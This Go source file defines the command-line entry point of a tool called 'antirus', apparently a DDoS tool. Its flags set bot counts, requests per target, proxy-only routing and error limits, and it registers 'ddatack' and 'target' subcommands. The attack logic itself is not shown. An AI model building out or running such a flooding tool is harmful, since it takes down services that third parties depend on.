package cmd

import (
	"github.com/spf13/cobra"
)

var (
	botsNum     int
	reqPerEpoch int
	onlyProxy   bool
	maxErrCount int
)

func Execute() {
	var rootCmd = &cobra.Command{Use: "antirus"}
	rootCmd.PersistentFlags().IntVar(&botsNum, "bots", 200, "кількість ботів (активних з'єднань)")
	rootCmd.PersistentFlags().IntVar(&reqPerEpoch, "epoch", 10_000, "к-сть запитів перед новою ціллю")
	rootCmd.PersistentFlags().BoolVar(&onlyProxy, "onlyproxy", false, "з'єднання тільки через проксі")
	rootCmd.PersistentFlags().IntVar(&maxErrCount, "errcount", 100, "к-сть помилок на бота, щоб той закінчив роботу")

	rootCmd.AddCommand(ddatackCmd)
	rootCmd.AddCommand(targetCmd)
	rootCmd.Execute()
}
